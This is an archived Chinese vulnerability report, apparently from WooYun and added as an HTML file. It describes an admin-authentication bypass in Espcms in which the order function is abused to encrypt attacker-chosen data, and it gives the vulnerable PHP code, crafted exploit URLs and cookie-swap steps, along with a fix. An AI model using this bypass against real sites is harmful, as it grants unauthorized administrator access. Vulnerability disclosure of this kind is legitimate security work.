@@ -1,0 +1,261 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Espcms V5.6.13.04.22 UTF8 正式版另类过后台所有模块验证漏洞之5/N  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Espcms V5.6.13.04.22 UTF8 正式版另类过后台所有模块验证漏洞之5/N  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Code_Sec">Code_Sec</a> 
+</li><li>提交时间：		2013-05-15 09:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-20：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-08-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">另类利用Espcms的加解密函数，绕过后台所有模块的权限验证<br />
+额。。。解释起来比较长，算是一种思路</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">后台权限验证的类文件：\public\class_connector.php<br />
+<br />
+</p><pre><code>function admin_purview() {<br />
+		if ($this-&gt;fun-&gt;accept(&#039;archive&#039;, &#039;R&#039;) == &#039;filemanage&#039; &amp;&amp; $this-&gt;fun-&gt;accept(&#039;action&#039;, &#039;R&#039;) == &#039;batupfilesave&#039;) {<br />
+<br />
+			$ecisp_admininfo = $this-&gt;fun-&gt;accept(&#039;ecisp_admininfo&#039;, &#039;G&#039;);<br />
+			$esp_powerlist = $this-&gt;fun-&gt;accept(&#039;esp_powerlist&#039;, &#039;G&#039;);<br />
+<br />
+			$gettype = false;<br />
+		} else {<br />
+			$ecisp_admininfo = $this-&gt;fun-&gt;accept(&#039;ecisp_admininfo&#039;, &#039;C&#039;);<br />
+			$esp_powerlist = $this-&gt;fun-&gt;accept(&#039;esp_powerlist&#039;, &#039;C&#039;);<br />
+			$gettype = true;<br />
+		}<br />
+		$arr_purview = explode(&#039;|&#039;, $this-&gt;fun-&gt;eccode($ecisp_admininfo, &#039;DECODE&#039;, db_pscode));</code></pre><p class='detail'><br />
+<br />
+关键代码解释：<br />
+<br />
+我们如果知道db_pscode的值的话就可以任意构造$ecisp_admininfo了，但是不可能<br />
+<br />
+db_pscode在网站初始化的时候就已经设定，并且是随机生成的32字符串<br />
+<br />
+define(&#039;db_pscode&#039;, &#039;5ae8d385e6ae4a4f633cacd28&#039;);<br />
+<br />
+<br />
+<br />
+换个思路：<br />
+<br />
+程序中其他的文件会用到加密函数，如果这个需要加密的变量可控，而且加密后的密文我们可以拿到。这样就相当于让程序帮我们构造找我们需要的加密数据了。<br />
+<br />
+<br />
+<br />
+最终找到一个文件符合以上的需求\interface\order.php：<br />
+<br />
+</p><pre><code>function in_orderupdae() {<br />
+		$bprice = $this-&gt;fun-&gt;accept(&#039;bprice&#039;, &#039;P&#039;);<br />
+		$didlist = $this-&gt;fun-&gt;accept(&#039;did&#039;, &#039;P&#039;);<br />
+		$amountlist = $this-&gt;fun-&gt;accept(&#039;amount&#039;, &#039;P&#039;);<br />
+		foreach ($didlist as $key =&gt; $value) {<br />
+			$arraykeyname = &#039;k&#039; . $value;<br />
+			$amount = intval($amountlist[$key]);<br />
+			$orderlist[$arraykeyname] = array(&#039;did&#039; =&gt; $value, &#039;amount&#039; =&gt; $amount);<br />
+		}<br />
+		$orderlist_ser = serialize($orderlist);<br />
+<br />
+		$this-&gt;fun-&gt;setcookie(&#039;ecisp_order_list&#039;, $this-&gt;fun-&gt;eccode($orderlist_ser, &#039;ENCODE&#039;, db_pscode), 7200);</code></pre><p class='detail'><br />
+<br />
+通过代码我们可以看到$orderlist有可能可以被我们控制，为了说明方便加段代码输出：<br />
+<br />
+</p><pre><code>function in_orderupdae() {<br />
+		$bprice = $this-&gt;fun-&gt;accept(&#039;bprice&#039;, &#039;G&#039;);<br />
+		$didlist = $this-&gt;fun-&gt;accept(&#039;did&#039;, &#039;G&#039;);<br />
+		$amountlist = $this-&gt;fun-&gt;accept(&#039;amount&#039;, &#039;G&#039;);<br />
+		foreach ($didlist as $key =&gt; $value) {<br />
+			$arraykeyname = &#039;k&#039; . $value;<br />
+			$amount = intval($amountlist[$key]);<br />
+			$orderlist[$arraykeyname] = array(&#039;did&#039; =&gt; $value, &#039;amount&#039; =&gt; $amount);<br />
+		}<br />
+		$orderlist_ser = serialize($orderlist);<br />
+<br />
+		$this-&gt;fun-&gt;setcookie(&#039;ecisp_order_list&#039;, $this-&gt;fun-&gt;eccode($orderlist_ser, &#039;ENCODE&#039;, db_pscode), 7200);<br />
+		$ecisp_admininfo = $this-&gt;fun-&gt;eccode($orderlist_ser, &#039;ENCODE&#039;, db_pscode);<br />
+		$arr_purview = explode(&#039;|&#039;, $this-&gt;fun-&gt;eccode($ecisp_admininfo, &#039;DECODE&#039;, db_pscode));<br />
+		list($this-&gt;esp_adminuserid, $this-&gt;esp_username, $this-&gt;esp_password, $this-&gt;esp_useragent, $this-&gt;esp_powerid, $this-&gt;esp_inputclassid, $this-&gt;esp_softurl) = $arr_purview;<br />
+		print_r($arr_purview);<br />
+		echo &quot;&lt;br /&gt;&quot;;<br />
+		echo &quot;esp_adminuserid-&gt;&quot;.$this-&gt;esp_adminuserid.&quot;&lt;br /&gt;&quot;;<br />
+		echo &quot;esp_username-&gt;&quot;.$this-&gt;esp_username.&quot;&lt;br /&gt;&quot;;<br />
+		echo &quot;esp_softurl-&gt;&quot;.$this-&gt;esp_softurl.&quot;&lt;br /&gt;&quot;;<br />
+		echo &quot;esp_useragent-&gt;&quot;.$this-&gt;esp_useragent;;die();</code></pre><p class='detail'><br />
+<br />
+构造url: <br />
+<br />
+http://127.0.0.1/index.php?ac=order&amp;at=orderupdae&amp;bprice=anb&amp;did[aa]=87|dcc|ccc|a1|a2|a3|a4|a5&amp;amount=1<br />
+<br />
+最终输出的结果为：<br />
+<br />
+</p><pre><code>Array ( [0] =&gt; a:1:{s:26:&quot;k87 [1] =&gt; dcc [2] =&gt; ccc [3] =&gt; a1 [4] =&gt; a2 [5] =&gt; a3 [6] =&gt; a4 [7] =&gt; a5&quot;;a:2:{s:3:&quot;did&quot;;s:25:&quot;87 [8] =&gt; dcc [9] =&gt; ccc [10] =&gt; a1 [11] =&gt; a2 [12] =&gt; a3 [13] =&gt; a4 [14] =&gt; a5&quot;;s:6:&quot;amount&quot;;i:1;}} )<br />
+esp_adminuserid-&gt;a:1:{s:26:&quot;k87<br />
+esp_username-&gt;dcc<br />
+esp_softurl-&gt;a4<br />
+esp_useragent-&gt;a1</code></pre><p class='detail'><br />
+<br />
+再返回之前admin_purview权限验证的函数对比，此时esp_adminuserid满足不为空，esp_username也满足不为空，esp_softurl和esp_useragent都是可控的。<br />
+<br />
+esp_softurl代表网站后台的路径，esp_useragent代表本机agent值，都是可知的。用md5加密下。<br />
+<br />
+最后构造的URL:<br />
+<br />
+http://127.0.0.1/index.php?ac=order&amp;at=orderupdae&amp;bprice=anb&amp;did[aa]=87|dcc|ccc|5f4f40bac141a48d05a94ac90514fe05|a2|a3|c8273f6a0177588459b1971c65829cc6|a5&amp;amount=1<br />
+<br />
+</p><p class="detail"><a href="../images/14220725a2c988c255e9d810f0c9a56f2e454aef.jpg" target="_blank"><img src="../images/14220725a2c988c255e9d810f0c9a56f2e454aef.jpg" alt="g.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+把cookie中ecisp_order_list改为ecisp_admininfo<br />
+<br />
+访问后台地址：<br />
+<br />
+</p><p class="detail"><a href="../images/142210127a15f5bcc6a96f7212c32f6e354b1bb0.jpg" target="_blank"><img src="../images/142210127a15f5bcc6a96f7212c32f6e354b1bb0.jpg" alt="i.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">下面显示Cookie err，木问题，点其他连接都是OK的<br />
+<br />
+</p><p class="detail"><a href="../images/142212206468038204590af773ce689daa809852.jpg" target="_blank"><img src="../images/142212206468038204590af773ce689daa809852.jpg" alt="j.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">后台的权限还是从cookie解密获取帐号和密码后去数据库验证一遍 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Code_Sec" title="Code_Sec">Code_Sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023746" title="Espcms V5.6.13.04.22 UTF8 正式版另类过后台所有模块验证漏洞之5/N">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-05-20 09:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23746";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
